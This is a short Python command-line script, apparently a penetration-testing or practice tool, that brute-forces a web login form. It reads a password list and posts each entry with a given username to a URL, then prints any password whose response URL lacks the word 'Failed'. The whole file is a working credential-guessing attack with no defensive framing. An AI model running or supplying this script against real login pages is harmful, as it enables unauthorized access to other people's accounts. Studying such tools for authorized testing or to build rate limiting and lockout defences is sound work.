import requests
import sys

def bruteforce_authenticate(url, user_name, posible_password):
    data = {
        "username": user_name,
        "password": posible_password
    }
    response = requests.post(url, data=data)
    #print(response.url)
    if not ("Failed" in response.url):
        print("Password: "+posible_password)


def bruteforce_password(url, user_name, passwords_file):
    print("[ url:",url,"| user_name:",user_name," | passwords_file:",passwords_file," ] ")
    with open(passwords_file, 'r') as file:
        for posible_password in file:
            bruteforce_authenticate(url, user_name, posible_password.strip())

    
if __name__ == "__main__":
    url=sys.argv[1]
    user_name=sys.argv[2]
    passwords_file=sys.argv[3]
    bruteforce_password(url, user_name, passwords_file)
